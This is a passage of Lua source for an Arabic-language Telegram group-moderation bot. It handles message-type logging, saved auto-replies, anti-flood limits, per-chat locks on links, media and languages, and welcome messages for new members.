if not DevAbs:get(DevProx.."bot:enable:"..msg.chat_id_) and not idf:match("^(%d+)") and not is_sudo3(msg.sender_user_id_, msg.chat_id_) then
print("Return False [ Not Enable ]")
return false
end
--     Source DevProx     --
if msg and msg.send_state_.ID == "MessageIsSuccessfullySent" then
function get_mymsg_contact(extra, result, success)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,get_mymsg_contact)
return
end
--     Source DevProx     --
DevAbs:incr(DevProx.."bot:allmsgs")
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match('-100(%d+)') then
if msg.can_be_deleted_ == true then 
DevAbs:sadd(DevProx.."bot:groups",msg.chat_id_)
end
if not DevAbs:sismember(DevProx.."bot:groups",msg.chat_id_) then
DevAbs:sadd(DevProx.."bot:groups",msg.chat_id_)
end
elseif id:match('^(%d+)') then
if not DevAbs:sismember(DevProx.."bot:userss",msg.chat_id_) then
DevAbs:sadd(DevProx.."bot:userss",msg.chat_id_)
end
else
if not DevAbs:sismember(DevProx.."bot:groups",msg.chat_id_) then
DevAbs:sadd(DevProx.."bot:groups",msg.chat_id_)
end
end
end
--     Source DevProx     --
-------- MSG TYPES ---------
if msg.content_ then
if msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" then
print("This is [ Inline ]")
msg_type = 'MSG:Inline'
end
--     Source DevProx     --
if msg.content_.ID == "MessageText" then
text = msg.content_.text_
print("This is [ Text ]")
msg_type = 'MSG:Text'
end
--     Source DevProx     --
if msg.content_.ID == "MessageChatAddMembers" then
DevAbs:incr(DevProx..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)
end
if msg.content_.ID == "MessagePhoto" then
DevAbs:incr(DevProx.."Photo:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
if msg.content_.ID == "MessageAnimation" then
DevAbs:incr(DevProx.."Gif:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
if msg.content_.ID == "MessageVideo" then
DevAbs:incr(DevProx.."Video:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
if msg.content_.ID == "MessageAudio" then
DevAbs:incr(DevProx.."Audio:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
if msg.content_.ID == "MessageVoice" then
DevAbs:incr(DevProx.."Voice:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
if msg.content_.ID == "MessageSticker" then
DevAbs:incr(DevProx.."sticker:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
--     Source DevProx     --
if msg.content_.ID == "MessagePhoto" then
print("This is [ Photo ]")
msg_type = 'MSG:Photo'
end
--     Source DevProx     --
if msg.content_.ID == "MessageChatAddMembers" then
print("This is [ New User Add ]")
msg_type = 'MSG:NewUserAdd'
end
--     Source DevProx     --
if msg.content_.ID == "MessageDocument" then
print("This is [ File Or Document ]")
msg_type = 'MSG:Document'
end
--     Source DevProx     --
if msg.content_.ID == "MessageSticker" then
print("This is [ Sticker ]")
msg_type = 'MSG:Sticker'
end
--     Source DevProx     --
if msg.content_.ID == "MessageAudio" then
print("This is [ Audio ]")
msg_type = 'MSG:Audio'
end
--     Source DevProx     --
if msg.content_.ID == "MessageVoice" then
print("This is [ Voice ]")
msg_type = 'MSG:Voice'
end
--     Source DevProx     --
if msg.content_.ID == "MessageVideo" then
print("This is [ Video ]")
msg_type = 'MSG:Video'
end
--     Source DevProx     --
if msg.content_.ID == "MessageAnimation" then
print("This is [ Gif ]")
msg_type = 'MSG:Gif'
end
--     Source DevProx     --
if msg.content_.ID == "MessageLocation" then
print("This is [ Location ]")
msg_type = 'MSG:Location'
end
--     Source DevProx     --
if msg.content_.ID == "MessageChatJoinByLink" then
print("This is [ Msg Join By link ]")
msg_type = 'MSG:NewUser'
end
--     Source DevProx     --
if not msg.reply_markup_ and msg.via_bot_user_id_ ~= 0 then
print("This is [ MarkDown ]")
msg_type = 'MSG:MarkDown'
end
--     Source DevProx     --
if msg.content_.ID == "MessageChatJoinByLink" then
print("This is [ Msg Join By Link ]")
msg_type = 'MSG:JoinByLink'
end
--     Source DevProx     --
if msg.content_.ID == "MessageContact" then
print("This is [ Contact ]")
msg_type = 'MSG:Contact'
end
---
end
--     Source DevProx     --
if ((not d) and chat) then
if msg.content_.ID == "MessageText" then
do_notify (chat.title_, msg.content_.text_)
else
do_notify (chat.title_, msg.content_.ID)
end
end
--     Source DevProx     --
if msg.content_.photo_ then
if DevAbs:get(DevProx..'bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_) then
if msg.content_.photo_.sizes_[3] then
photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_
else
photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم تغيير صـۄرة ٱڵمجـمۄعة'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_)
setphoto(msg.chat_id_, photo_id)
end end
--     Source DevProx     --
text = msg.content_.text_ 
if msg.content_.text_ or msg.content_.video_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then 
if text == 'الغاء' then   
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تـۖم ٱڵغاء حفظ ٱڵـرد', 1, 'md')
DevAbs:del(DevProx..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'')
DevAbs:del(DevProx..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
return false
end
local content_text = DevAbs:get(DevProx..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
if content_text == 'save_repgp' then DevAbs:del(DevProx..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
local content_text = DevAbs:get(DevProx..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'')
if msg.content_.video_ then DevAbs:set(DevProx..'video_repgp'..content_text..''..msg.chat_id_..'', msg.content_.video_.video_.persistent_id_)
end
if msg.content_.sticker_ then DevAbs:set(DevProx..'stecker_repgp'..content_text..''..msg.chat_id_..'', msg.content_.sticker_.sticker_.persistent_id_) 
end 
if msg.content_.voice_ then DevAbs:set(DevProx..'voice_repgp'..content_text..''..msg.chat_id_..'', msg.content_.voice_.voice_.persistent_id_) 
end
if msg.content_.audio_ then DevAbs:set(DevProx..'audio_repgp'..content_text..''..msg.chat_id_..'', msg.content_.audio_.audio_.persistent_id_) 
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
DevAbs:set(DevProx..'photo_repgp'..content_text..''..msg.chat_id_..'', photo_in_group) 
end
if msg.content_.animation_ then DevAbs:set(DevProx..'gif_repgp'..content_text..''..msg.chat_id_..'', msg.content_.animation_.animation_.persistent_id_) 
end 
if msg.content_.text_ then
DevAbs:set(DevProx..'text_repgp'..content_text..''..msg.chat_id_..'', msg.content_.text_)
end 
DevAbs:sadd('rep_owner'..msg.chat_id_..'',content_text) 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تـۖم حفـۨظ ٱڵـرد ٱڵـجـډيـډ', 1, 'md') 
DevAbs:del(DevProx..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'')
return false 
end 
end
if msg.content_.text_ and not DevAbs:get(DevProx..'lock_reeeep'..msg.chat_id_) then 
if DevAbs:get(DevProx..'video_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(DevProx..'video_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end 
if DevAbs:get(DevProx..'voice_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(DevProx..'voice_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end
if DevAbs:get(DevProx..'audio_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(DevProx..'audio_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end
if DevAbs:get(DevProx..'photo_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(DevProx..'photo_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end
if DevAbs:get(DevProx..'gif_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(DevProx..'gif_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end 
if DevAbs:get(DevProx..'stecker_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(DevProx..'stecker_repgp'..msg.content_.text_..''..msg.chat_id_..''))
end
if DevAbs:get(DevProx..'text_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
Dev_Abs(msg.chat_id_, msg.id_, 1, DevAbs:get(DevProx..'text_repgp'..msg.content_.text_..''..msg.chat_id_..'') , 1, 'md') 
end end
--     Source DevProx     --
text = msg.content_.text_
if msg.content_.text_ or msg.content_.video_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then
local content_text = DevAbs:get(DevProx.."add:repallt"..msg.sender_user_id_)
if content_text == 'save_rep' then
DevAbs:del(DevProx.."add:repallt"..msg.sender_user_id_)
local content_text = DevAbs:get(DevProx.."addreply2:"..msg.sender_user_id_)
if msg.content_.video_ then
DevAbs:set(DevProx.."video_repall"..content_text, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.sticker_ then
DevAbs:set(DevProx.."stecker_repall"..content_text, msg.content_.sticker_.sticker_.persistent_id_)
end
if msg.content_.voice_ then
DevAbs:set(DevProx.."voice_repall"..content_text, msg.content_.voice_.voice_.persistent_id_)
end
if msg.content_.audio_ then
DevAbs:set(DevProx.."audio_repall"..content_text, msg.content_.audio_.audio_.persistent_id_)
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_all_groups = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_all_groups = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_all_groups = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_all_groups = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
DevAbs:set(DevProx.."photo_repall"..content_text, photo_in_all_groups)
end
if msg.content_.animation_ then
DevAbs:set(DevProx.."gif_repall"..content_text, msg.content_.animation_.animation_.persistent_id_)
end
if msg.content_.text_ then
DevAbs:set(DevProx.."text_repall"..content_text, msg.content_.text_)
end 
DevAbs:sadd('rep_sudo',content_text)
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تـۖم حفـۨظ ٱڵـرد ٱڵـجـډيـډ', 1, 'md') 
DevAbs:del(DevProx.."addreply2:"..msg.sender_user_id_)
return false end end
if msg.content_.text_ and not DevAbs:get(DevProx..'lock_reeeep'..msg.chat_id_) then
if DevAbs:get(DevProx.."video_repall"..msg.content_.text_) then
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(DevProx.."video_repall"..msg.content_.text_))
end
if DevAbs:get(DevProx.."voice_repall"..msg.content_.text_)  then
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(DevProx.."voice_repall"..msg.content_.text_))
end
if DevAbs:get(DevProx.."audio_repall"..msg.content_.text_)  then
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(DevProx.."audio_repall"..msg.content_.text_))
end
if DevAbs:get(DevProx.."photo_repall"..msg.content_.text_)  then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(DevProx.."photo_repall"..msg.content_.text_))
end
if  DevAbs:get(DevProx.."gif_repall"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(DevProx.."gif_repall"..msg.content_.text_))
end
if DevAbs:get(DevProx.."stecker_repall"..msg.content_.text_) then
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(DevProx.."stecker_repall"..msg.content_.text_))
end
if DevAbs:get(DevProx.."text_repall"..msg.content_.text_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, DevAbs:get(DevProx.."text_repall"..msg.content_.text_) ,  1, "md")
end
end 
--     Source DevProx     --
if msg.content_.video_ or msg.content_.voice_ or msg.content_.audio_ then
local content_text = DevAbs:get(DevProx.."add:repmusic"..msg.sender_user_id_)
if content_text == 'save_repmusic' then
DevAbs:del(DevProx.."add:repmusic"..msg.sender_user_id_)
local content_text = DevAbs:get(DevProx.."addreply3:"..msg.sender_user_id_)
if msg.content_.video_ then
DevAbs:set(DevProx.."video_repmusic"..content_text, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.voice_ then
DevAbs:set(DevProx.."voice_repmusic"..content_text, msg.content_.voice_.voice_.persistent_id_)
end
if msg.content_.audio_ then
DevAbs:set(DevProx.."audio_repmusic"..content_text, msg.content_.audio_.audio_.persistent_id_)
end
DevAbs:sadd('repmusic_sudo',content_text)
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تـۖم حفـۨظ ٱلٱغنيه ٱڵـجـډيـډة', 1, 'md') 
DevAbs:del(DevProx.."addreply3:"..msg.sender_user_id_)
return false end end
if msg.content_.text_ and not DevAbs:get(DevProx..'lock_reeeep'..msg.chat_id_) then
if DevAbs:get(DevProx.."video_repmusic"..msg.content_.text_) then
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(DevProx.."video_repmusic"..msg.content_.text_))
end
if DevAbs:get(DevProx.."voice_repmusic"..msg.content_.text_)  then
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(DevProx.."voice_repmusic"..msg.content_.text_))
end
if DevAbs:get(DevProx.."audio_repmusic"..msg.content_.text_)  then
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(DevProx.."audio_repmusic"..msg.content_.text_))
end
end 
-- end functions DevProx --
--      Anti FLood       -- 
--      Flood Max        --
local flmax = 'flood:max:'..msg.chat_id_
if not DevAbs:get(DevProx..flmax) then
floodMax = 5
else
floodMax = tonumber(DevAbs:get(DevProx..flmax))
end
--     Source DevProx     --
--          Msg           --
local pm = 'flood:'..msg.sender_user_id_..':'..msg.chat_id_..':msgs'
if not DevAbs:get(DevProx..pm) then
msgs = 0
else
msgs = tonumber(DevAbs:get(DevProx..pm))
end
--     Source DevProx     --
--    Flood Check Time    --
local TIME_CHECK = 2
--     Source DevProx     --
--      Flood Check       --
local absflood = 'anti-flood:'..msg.chat_id_
if msgs > (floodMax - 1) then
if DevAbs:get(DevProx..'floodstatus'..msg.chat_id_) == 'Kicked' then
del_all_msgs(msg.chat_id_, msg.sender_user_id_)
chat_kick(msg.chat_id_, msg.sender_user_id_)
ABS_PROX = '☬︙ٱڵـعضو ↫ '..CatchName(result.first_name_,15)..' \n☬︙قٱم بٱڵتكرٱر ٱڵمحدد تم طرده '
absmoned(msg.chat_id_, result.id_, msg.id_, ABS_PROX, 13, utf8.len(CatchName(result.first_name_,15))) 
elseif DevAbs:get(DevProx..'floodstatus'..msg.chat_id_) == 'DelMsg' then
del_all_msgs(msg.chat_id_, msg.sender_user_id_)
else
del_all_msgs(msg.chat_id_, msg.sender_user_id_)
end
end
--     Source DevProx     --
local sendabs = function(chat_id, reply_to_message_id, text, offset, length, userid)
tdcli_function({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID = "InputMessageText",
text_ = text,
disable_web_page_preview_ = 1,
clear_draft_ = 0,
entities_ = {
[0] = {
ID = "MessageEntityMentionName",
offset_ = offset,
length_ = length,
user_id_ = userid
}
}
}
}, dl_cb, nil)
end
--     Source DevProx     --
--      Process mod       --
local check_username = function(extra, result, success)
local fname = result.first_name_ or ""
local lname = result.last_name_ or ""
local name = fname .. " " .. lname
local username = result.username_
local svuser = "user:Name" .. result.id_
local id = result.id_
if username then
DevAbs:set(DevProx..svuser, "@" .. username)
else
DevAbs:set(DevProx..svuser, name)
end
end
getUser(msg.sender_user_id_, check_username)
--     Source DevProx     --
----- START MSG CHECKS -----
if is_banned(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
chat_kick(msg.chat_id_, msg.sender_user_id_)
return
end
if is_muted(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
return
end
if is_gbanned(msg.sender_user_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
chat_kick(msg.chat_id_, msg.sender_user_id_)
delete_msg(chat,msgs)
return
end
DevAbs:incr(DevProx..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
DevAbs:incr(DevProx..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
DevAbs:incr(DevProx..'group:msgs'..msg.chat_id_)
if msg.content_.ID == "MessagePinMessage" then
if DevAbs:get(DevProx..'pinnedmsg'..msg.chat_id_) and DevAbs:get(DevProx..'bot:pin:mute'..msg.chat_id_) then
unpinmsg(msg.chat_id_)
local pin_id = DevAbs:get(DevProx..'pinnedmsg'..msg.chat_id_)
pinmsg(msg.chat_id_,pin_id,0)
end
end
if DevAbs:get(DevProx..'bot:viewget'..msg.sender_user_id_) then
if not msg.forward_info_ then
DevAbs:del(DevProx..'bot:viewget'..msg.sender_user_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙عدد مشٱهدٱت ٱڵمنشور هوَ : ('..msg.views_..') \n ', 1, 'md')
DevAbs:del(DevProx..'bot:viewget'..msg.sender_user_id_)
end
end
--     Source DevProx     --
--         Photo          --
if msg_type == 'MSG:Photo' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(DevProx..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if DevAbs:get(DevProx..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Photo]")
end
end
end
if DevAbs:get(DevProx..'bot:photo:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Photo]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if DevAbs:get(DevProx..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Photo]")
if DevAbs:get(DevProx..'bot:strict'..msg.chat_id_) then
chat_kick(msg.chat_id_, msg.sender_user_id_)
end
end
end
if DevAbs:get(DevProx..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Photo]")
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(DevProx..'bot:abstag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Photo]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(DevProx..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Photo]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(DevProx..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Photo]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(DevProx..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Photo]")
end
end
end
end
--     Source DevProx     --
--        Markdown        --
elseif msg_type == 'MSG:MarkDown' then
if DevAbs:get(DevProx..'markdown:lock'..msg.chat_id_) then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
end
end
--     Source DevProx     --
--        Document        --
elseif msg_type == 'MSG:Document' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(DevProx..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if DevAbs:get(DevProx..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Document]")
end
end
end
if DevAbs:get(DevProx..'bot:document:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Document]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if DevAbs:get(DevProx..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Document]")
if DevAbs:get(DevProx..'bot:strict'..msg.chat_id_) then
chat_kick(msg.chat_id_, msg.sender_user_id_)
end
end
end
if DevAbs:get(DevProx..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Document]")
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(DevProx..'bot:abstag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Document]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(DevProx..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Document]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(DevProx..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Document]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(DevProx..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Document]")
end
end
end
end
--     Source DevProx     --
--         Inline         --
elseif msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" and msg.via_bot_user_id_ ~= 0 then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(DevProx..pm, TIME_CHECK, msgs+1)
end
if DevAbs:get(DevProx..'bot:inline:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Inline]")
end
end
--     Source DevProx     --
--        Sticker         --
elseif msg_type == 'MSG:Sticker' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(DevProx..pm, TIME_CHECK, msgs+1)
end
if DevAbs:get(DevProx..'bot:sticker:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Sticker]")
end
end
elseif msg_type == 'MSG:JoinByLink' then
if DevAbs:get(DevProx..'bot:tgservice:jk'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_ 
 delete_msg(chat,msgs)
print("Deleted [Lock] [Tgservice] [JoinByLink]")
return
end
function get_welcome(extra,result,success)
if DevAbs:get(DevProx..'welcome:'..msg.chat_id_) then
text = DevAbs:get(DevProx..'welcome:'..msg.chat_id_)
else
text = '☬︙أهـلاً بِـك ↫ [firstname](https://telegram.me/usernamee) \n☬︙فـي ↫ '..title_name(msg.chat_id_)..'\n☬︙ٱڵـتـزم بٱڵـقوانين ڵـتجنب ٱڵـطرد'
end
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('lastname',(result.last_name_ or ''))
local text = text:gsub('username',(result.username_ or ''))
local text = text:gsub('usernamee',(result.username_ or 'Dev_Prox'))
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
if DevAbs:get(DevProx.."bot:welcome"..msg.chat_id_) then
getUser(msg.sender_user_id_,get_welcome)
end
--     Source DevProx     --
--      New User Add      --
elseif msg_type == 'MSG:NewUserAdd' then
if DevAbs:get(DevProx..'bot:tgservice:jk'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tgservice] [NewUserAdd]")
return
end
if msg.content_.members_[0].username_ and msg.content_.members_[0].username_:match("[Bb][Oo][Tt]$") then
if not is_admin(msg.content_.members_[0].id_, msg.chat_id_) then
if DevAbs:get(DevProx..'bot:bots:gkgk'..msg.chat_id_) then
chat_kick(msg.chat_id_, msg.content_.members_[0].id_)
return false
end
end
end
if is_banned(msg.content_.members_[0].id_, msg.chat_id_) then
chat_kick(msg.chat_id_, msg.content_.members_[0].id_)
return false
end
if DevAbs:get(DevProx.."bot:welcome"..msg.chat_id_) then
if DevAbs:get(DevProx..'welcome:'..msg.chat_id_) then
text = DevAbs:get(DevProx..'welcome:'..msg.chat_id_)
else
text = '☬︙أهـلاً بِـك ↫ [firstname](https://telegram.me/usernamee) \n☬︙فـي ↫ '..title_name(msg.chat_id_)..'\n☬︙ٱڵـتـزم بٱڵـقوانين ڵـتجنب ٱڵـطرد'
end
local text = text:gsub('firstname',(msg.content_.members_[0].first_name_ or ''))
local text = text:gsub('lastname',(msg.content_.members_[0].last_name_ or ''))
local text = text:gsub('username',(msg.content_.members_[0].username_ or ''))
local text = text:gsub('usernamee',(msg.content_.members_[0].username_ or 'Dev_Prox'))
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
--     Source DevProx     --
--        Contact         --
elseif msg_type == 'MSG:Contact' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(DevProx..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if DevAbs:get(DevProx..'bot:forward:mute'..msg.chat_id_) then
